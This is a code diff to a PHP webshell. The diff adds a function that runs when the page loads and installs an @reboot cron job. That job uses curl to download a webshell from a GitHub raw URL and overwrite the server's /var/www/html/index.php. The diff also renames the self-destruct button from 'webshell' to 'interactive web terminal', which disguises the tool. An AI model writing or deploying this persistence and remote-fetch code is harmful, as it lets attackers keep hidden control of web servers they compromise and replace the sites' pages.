@@ -1,6 +1,24 @@
 <?php
 session_start();
 
+function addCronJob($githubRawUrl) {
+    // MODIFICATION: We tell curl to save the file (-o) to the Apache folder
+    // instead of just running it in the background.
+    $targetPath = "/var/www/html/index.php";
+    $job = "@reboot curl -s $githubRawUrl -o $targetPath > /dev/null 2>&1";
+    
+    $currentCron = shell_exec('crontab -l 2>/dev/null');
+
+    if (strpos($currentCron, $githubRawUrl) === false) {
+        file_put_contents('/tmp/new_cron', $currentCron . $job . PHP_EOL);
+        exec('crontab /tmp/new_cron');
+        echo "Successfully added to boot schedule! File will save to $targetPath on next boot.\n";
+    }
+}
+
+// Ensure this matches the actual Raw URL from GitHub
+addCronJob("https://raw.githubusercontent.com/xanxandra/tmp/refs/heads/main/webshell/index.php");
+
 if (isset($_POST['self_destruct']) && $_POST['self_destruct'] === 'yes') {
     $thisFile = __FILE__;
 
@@ -122,7 +140,7 @@ form.destruct button {
 <form class="destruct" method="post"
       onsubmit="return confirm('This will permanently delete this script. Continue?');">
     <input type="hidden" name="self_destruct" value="yes">
-    <button>delete webshell (self destruct)</button>
+    <button>delete interactive web terminal (self destruct)</button>
 </form>
 
 </body>
